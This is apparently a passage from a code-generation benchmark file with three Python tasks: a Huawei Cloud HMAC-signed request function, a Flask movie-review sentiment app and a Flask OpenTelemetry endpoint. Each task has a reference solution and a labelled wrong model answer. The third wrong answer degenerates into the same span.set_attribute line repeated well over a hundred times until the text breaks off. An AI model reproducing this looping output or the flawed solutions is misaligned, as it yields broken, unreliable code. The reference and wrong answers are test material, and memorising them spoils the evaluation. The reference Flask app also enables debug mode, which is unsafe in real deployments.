    "Instruction": "Task Description: Implement an HTTP client function that sends authenticated requests to a Huawei Cloud API endpoint using HMAC-SHA256 signature for authentication.\n\nFunction Description: The function `request` sends HTTP requests to a specified API endpoint with proper authentication headers. It handles request signing, connection management, and response processing. The authentication follows Huawei Cloud's SDK-HMAC-SHA256 algorithm.\n\nInput:\n- `method`: [str] - HTTP method (e.g., 'GET', 'POST')\n- `path`: [str] - API endpoint path\n- `param`: [dict, optional] - Query parameters to be appended to the URL\n- `body`: [str/dict, optional] - Request body content (converted to JSON if dict)\n- `**params`: [dict, optional] - Additional query parameters\n\nOutput:\n- [dict] - Parsed JSON response from the API if successful\n- Raises Exception if HTTP status code indicates failure (status \u2265 300)\n\nNote: The function relies on global configuration in `Config` class (ID, TOKEN, PROXY) and API settings in `API` class (SCHEME, SITE). It performs the following operations:\n1. Constructs proper request headers with timestamp\n2. Generates HMAC-SHA256 signature\n3. Establishes HTTPS connection (with proxy support if configured)\n4. Sends request and processes response\n5. Handles errors and returns parsed data",
    "Canonical_solution": "from hashlib import sha256\nfrom hmac import new as hmac\nfrom binascii import hexlify\nfrom json import loads as jsondecode, dumps as jsonencode\nfrom logging import debug, info, warning\nfrom datetime import datetime\nfrom http.client import HTTPSConnection\nfrom urllib.parse import urlencode\n\nBasicDateFormat = \"%Y%m%dT%H%M%SZ\"\nAlgorithm = \"SDK-HMAC-SHA256\"\n\nclass Config:\n    ID = \"id\"  # AK\n    TOKEN = \"TOKEN\"  # AS\n    PROXY = None  # \u4ee3\u7406\u8bbe\u7f6e\n    TTL = None\n\nclass API:\n    SCHEME = 'https'\n    SITE = 'dns.myhuaweicloud.com'  # API endpoint\n\ndef request(method, path, param=None, body=None, **params):\n    if param:\n        params.update(param)\n\n    query = urlencode(sorted(params.items()))\n    headers = {\"content-type\": \"application/json\"}\n    headers[\"X-Sdk-Date\"] = datetime.strftime(datetime.utcnow(), BasicDateFormat)\n    headers[\"host\"] = API.SITE\n    sign_headers = []\n    for key in headers:\n        sign_headers.append(key.lower())\n    sign_headers.sort()\n\n    if body is None:\n        body = \"\"\n\n    hex_encode = HexEncodeSHA256Hash(body.encode('utf-8'))\n    canonical_headers = CanonicalHeaders(headers, sign_headers)\n\n    if path[-1] != '/':\n        sign_path = path + \"/\"\n    else:\n        sign_path = path\n\n    canonical_request = \"%s\\n%s\\n%s\\n%s\\n%s\\n%s\" % (method.upper(), sign_path, query,\n                                                    canonical_headers, \";\".join(sign_headers), hex_encode)\n\n    hashed_canonical_request = HexEncodeSHA256Hash(canonical_request.encode('utf-8'))\n    str_to_sign = \"%s\\n%s\\n%s\" % (Algorithm, headers['X-Sdk-Date'], hashed_canonical_request)\n\n    secret = Config.TOKEN\n    signature = hmac(secret.encode('utf-8'), str_to_sign.encode('utf-8'), digestmod=sha256).digest()\n    signature = hexlify(signature).decode()\n    auth_header = \"%s Access=%s, SignedHeaders=%s, Signature=%s\" % (\n        Algorithm, Config.ID, \";\".join(sign_headers), signature)\n    headers['Authorization'] = auth_header\n\n    if Config.PROXY:\n        conn = HTTPSConnection(Config.PROXY)\n        conn.set_tunnel(API.SITE, 443)\n    else:\n        conn = HTTPSConnection(API.SITE)\n    conn.request(method, API.SCHEME + \"://\" + API.SITE + path + '?' + query, body, headers)\n    info(API.SCHEME + \"://\" + API.SITE + path + '?' + query, body)\n    resp = conn.getresponse()\n    data = resp.read().decode('utf8')\n    resp.close()\n    if resp.status < 200 or resp.status >= 300:\n        warning('%s : error[%d]: %s', path, resp.status, data)\n        raise Exception(data)\n    else:\n        data = jsondecode(data)\n        debug('%s : result:%s', path, data)\n        return data\n\ndef HexEncodeSHA256Hash(data):\n    sha = sha256()\n    sha.update(data)\n    return sha.hexdigest()\n\ndef CanonicalHeaders(headers, signed_headers):\n    a = []\n    __headers = {}\n    for key in headers:\n        key_encoded = key.lower()\n        value = headers[key]\n        value_encoded = value.strip()\n        __headers[key_encoded] = value_encoded\n    for key in signed_headers:\n        a.append(key + \":\" + __headers[key])\n    return '\\n'.join(a) + \"\\n\"",
    "Code_level": "Function-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport hmac\nimport hashlib\nimport json\nimport time\nimport urllib.parse\nfrom urllib.request import Request, urlopen\nfrom urllib.error import HTTPError\n\nclass Config:\n    ID = 'your_id'\n    TOKEN = 'your_token'\n    PROXY = None\n\nclass API:\n    SCHEME = 'https'\n    SITE = 'api.huaweicloud.com'\n\ndef request(method, path, param=None, body=None, **params):\n    timestamp = str(int(time.time()))\n    headers = {\n        'Content-Type': 'application/json',\n        'X-Sdk-Date': timestamp,\n        'X-Sdk-Auth-Version': '3.0',\n        'X-Sdk-Project-Id': Config.ID,\n        'Authorization': generate_auth_header(method, path, timestamp, param, params)\n    }\n    url = f'{API.SCHEME}://{API.SITE}{path}'\n    if param:\n        url += '?' + urllib.parse.urlencode(param)\n    req = Request(url, headers=headers, data=json.dumps(body).encode() if body else None)\n    if Config.PROXY:\n        proxy_handler = urllib.request.ProxyHandler({'https': Config.PROXY})\n        opener = urllib.request.build_opener(proxy_handler)\n        response = opener.open(req)\n    else:\n        response = urlopen(req)\n    if response.getcode() >= 300:\n        raise Exception(f'HTTP error: {response.getcode()}')\n    return json.loads(response.read().decode())\n    \ndef generate_auth_header(method, path, timestamp, param, params):\n    canonical_uri = urllib.parse.quote(path, safe='')\n    canonical_querystring = urllib.parse.urlencode(sorted(param.items()) if param else [])\n    canonical_headers = 'content-type:application/json\\n' \\\n                        f'x-sdk-date:{timestamp}\\n' \\\n                        f'x-sdk-auth-version:3.0\\n' \\\n                        f'x-sdk-project-id:{Config.ID}\\n'\n    signed_headers = 'content-type;x-sdk-date;x-sdk-auth-version;x-sdk-project-id'\n    hashed_request_payload = hashlib.sha256(json.dumps(body).encode() if body else b'').hexdigest()\n    canonical_request = f'{method}\\n{canonical_uri}\\n{canonical_querystring}\\n' \\\n                        f'{canonical_headers}\\n{signed_headers}\\n{hashed_request_payload}'\n    credential_scope = f'{timestamp}/hwcloud/{Config.ID}/request'\n    hashed_canonical_request = hashlib.sha256(canonical_request.encode()).hexdigest()\n    string_to_sign = f'HMAC-SHA256\\n{timestamp}\\n{credential_scope}\\n{hashed_canonical_request}'\n    signature = hmac.new(Config.TOKEN.encode(), string_to_sign.encode(), hashlib.sha256).hexdigest()\n    auth_header = f'HMAC-SHA256 Credential={Config.ID}/{credential_scope}, ' \\\n                  f'SignedHeaders={signed_headers}, Signature={signature}'\n    return auth_header\n```"
  },
  {
    "Task_id": 134,
    "Instruction": "Task Description: Create a Flask-based web application for sentiment analysis of movie reviews that allows users to submit reviews, get sentiment predictions, and provide feedback to improve the classifier.\n\nClass Description: ReviewClassifier is a Flask web application that classifies movie reviews as positive or negative using a pre-trained classifier. It provides an interface for users to submit reviews, view predictions, and give feedback which is used to update the classifier and store in a SQLite database.\n\nAttributes:\n- app: [Flask] - The Flask application instance\n- clf: [sklearn classifier] - Pre-trained sentiment classifier loaded from pickle file\n- db: [str] - Path to SQLite database file for storing reviews\n- vect: [sklearn vectorizer] - Text vectorizer for feature extraction\n\nMethods:\n- __init__: [constructor]() -> None - Initializes the Flask app, loads classifier and vectorizer, sets up routes\n- classify: [classify](document: str) -> tuple[str, float] - Classifies a review document and returns (sentiment_label, probability)\n- train: [train](document: str, y: int) -> None - Updates classifier with new training example\n- sqlite_entry: [sqlite_entry](document: str, y: int) -> None - Stores review and sentiment in database\n- index: [index]() -> str - Renders main review submission form\n- results: [results]() -> str - Processes submitted review and renders prediction results\n- feedback: [feedback]() -> str - Handles user feedback and updates model/database\n- run: [run]() -> None - Starts the Flask development server",
    "Canonical_solution": "from flask import Flask, request, render_template\nfrom wtforms import Form, TextAreaField, validators\nimport pickle\nimport sqlite3\nimport os\nimport numpy as np\nfrom vectorizer import vect\n\nclass ReviewClassifier:\n    def __init__(self):\n        self.app = Flask(__name__)\n        cur_dir = os.path.dirname(__file__)\n        self.clf = pickle.load(open(os.path.join(cur_dir, 'pkl_objects', 'classifier.pkl'), 'rb'))\n        self.db = os.path.join(cur_dir, 'reviews.sqlite')\n        self.vect = vect\n        \n        self.app.route('/')(self.index)\n        self.app.route('/results', methods=['POST'])(self.results)\n        self.app.route('/thanks', methods=['POST'])(self.feedback)\n\n    def classify(self, document):\n        label = {0: 'negative', 1: 'positive'}\n        X = self.vect.transform([document])\n        y = self.clf.predict(X)[0]\n        proba = np.max(self.clf.predict_proba(X))\n        return label[y], proba\n\n    def train(self, document, y):\n        X = self.vect.transform([document])\n        self.clf.partial_fit(X, [y])\n\n    def sqlite_entry(self, document, y):\n        conn = sqlite3.connect(self.db)\n        c = conn.cursor()\n        c.execute(\"INSERT INTO review_db (review, sentiment, date) VALUES (?, ?, DATETIME('now'))\", (document, y))\n        conn.commit()\n        conn.close()\n\n    def index(self):\n        form = ReviewForm(request.form)\n        return render_template('reviewform.html', form=form)\n\n    def results(self):\n        form = ReviewForm(request.form)\n        if request.method == 'POST' and form.validate():\n            review = request.form['moviereview']\n            y, proba = self.classify(review)\n            return render_template('results.html',\n                                content=review,\n                                prediction=y,\n                                probability=round(proba*100, 2))\n        return render_template('reviewform.html', form=form)\n\n    def feedback(self):\n        feedback = request.form['feedback_button']\n        review = request.form['review']\n        prediction = request.form['prediction']\n\n        inv_label = {'negative': 0, 'positive': 1}\n        y = inv_label[prediction]\n        if feedback == 'Incorrect':\n            y = int(not(y))\n        self.train(review, y)\n        self.sqlite_entry(review, y)\n        return render_template('thanks.html')\n\n    def run(self):\n        self.app.run(debug=True)\n\nclass ReviewForm(Form):\n    moviereview = TextAreaField('',\n                            [validators.DataRequired(),\n                            validators.length(min=15)])",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nfrom flask import Flask, render_template, request, redirect, url_for\nimport pickle\nimport sqlite3\nfrom sklearn.feature_extraction.text import TfidfVectorizer\nfrom sklearn.naive_bayes import MultinomialNB\n\nclass ReviewClassifier:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.clf = pickle.load(open('classifier.pkl', 'rb'))\n        self.db = 'reviews.db'\n        self.vect = pickle.load(open('vectorizer.pkl', 'rb'))\n        self.app.add_url_rule('/', 'index', self.index)\n        self.app.add_url_rule('/results', 'results', self.results, methods=['POST'])\n        self.app.add_url_rule('/feedback', 'feedback', self.feedback, methods=['POST'])\n        self.app.add_url_rule('/run', 'run', self.run)\n\n    def classify(self, document):\n        X = self.vect.transform([document])\n        y_pred = self.clf.predict(X)\n        y_proba = self.clf.predict_proba(X)\n        return y_pred[0], y_proba[0][y_pred[0]]\n\n    def train(self, document, y):\n        X = self.vect.transform([document])\n        self.clf.partial_fit(X, [y])\n\n    def sqlite_entry(self, document, y):\n        conn = sqlite3.connect(self.db)\n        c = conn.cursor()\n        c.execute(\"INSERT INTO reviews (document, sentiment) VALUES (?, ?)\", (document, y))\n        conn.commit()\n        conn.close()\n\n    def index(self):\n        return render_template('index.html')\n\n    def results(self):\n        document = request.form['document']\n        sentiment_label, probability = self.classify(document)\n        return render_template('results.html', document=document, sentiment_label=sentiment_label, probability=probability)\n\n    def feedback(self):\n        document = request.form['document']\n        sentiment = int(request.form['sentiment'])\n        self.train(document, sentiment)\n        self.sqlite_entry(document, sentiment)\n        return redirect(url_for('index'))\n\n    def run(self):\n        self.app.run(debug=True)\n```"
  },
  {
    "Task_id": 137,
    "Instruction": "Task Description: Create a Flask-based HTTP server that handles incoming requests, processes them with OpenTelemetry tracing, and returns a response.\n\nFunction Description: The function `server_request` is a Flask route handler that processes GET requests to the \"/server_request\" endpoint. It starts a new OpenTelemetry span for tracing purposes, extracts the request context, collects request attributes, processes the request parameter, and returns a simple response.\n\nInput:\n- request: Flask request object containing HTTP request data\n- request.args.get(\"param\"): Optional query parameter passed in the URL\n\nOutput:\n- Returns a string \"served\" as the HTTP response\n- Side effect: Prints the value of the \"param\" query parameter if present\n- Side effect: Creates OpenTelemetry tracing span with request attributes",
    "Canonical_solution": "from flask import Flask, request\nfrom opentelemetry.instrumentation.wsgi import collect_request_attributes\nfrom opentelemetry.propagate import extract\nfrom opentelemetry.sdk.trace import TracerProvider\nfrom opentelemetry.sdk.trace.export import BatchSpanProcessor, ConsoleSpanExporter\nfrom opentelemetry.trace import SpanKind, get_tracer_provider, set_tracer_provider\n\napp = Flask(__name__)\nset_tracer_provider(TracerProvider())\ntracer = get_tracer_provider().get_tracer(__name__)\nget_tracer_provider().add_span_processor(BatchSpanProcessor(ConsoleSpanExporter()))\n\n@app.route(\"/server_request\")\ndef server_request():\n    with tracer.start_as_current_span(\n        \"server_request\",\n        context=extract(request.headers),\n        kind=SpanKind.SERVER,\n        attributes=collect_request_attributes(request.environ),\n    ):\n        print(request.args.get(\"param\"))\n        return \"served\"",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nfrom flask import Flask, request\nfrom opentelemetry import trace\nfrom opentelemetry.trace import SpanKind, Span, Status, StatusCode\n\napp = Flask(__name__)\ntracer = trace.get_tracer(__name__)\n\n@app.route('/server_request', methods=['GET'])\ndef server_request():\n    span = tracer.start_span(\"server_request\")\n    span.set_attribute(\"http.method\", request.method)\n    span.set_attribute(\"http.url\", request.url)\n    span.set_attribute(\"http.host\", request.host)\n    span.set_attribute(\"http.user_agent\", request.user_agent.string)\n    span.set_attribute(\"http.client_ip\", request.remote_addr)\n    span.set_attribute(\"http.request_content_length\", len(request.data))\n    span.set_attribute(\"http.request_content_type\", request.content_type)\n    span.set_attribute(\"http.request_accept\", request.accept_mimetypes)\n    span.set_attribute(\"http.request_accept_encoding\", request.accept_encodings)\n    span.set_attribute(\"http.request_accept_language\", request.accept_languages)\n    span.set_attribute(\"http.request_accept_charset\", request.accept_charsets)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_datetime\", request.accept_datetime)\n    span.set_attribute(\"http.request_accept_patch\", request.accept_patch)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    span.set_attribute(\"http.request_accept_ranges\", request.accept_ranges)\n    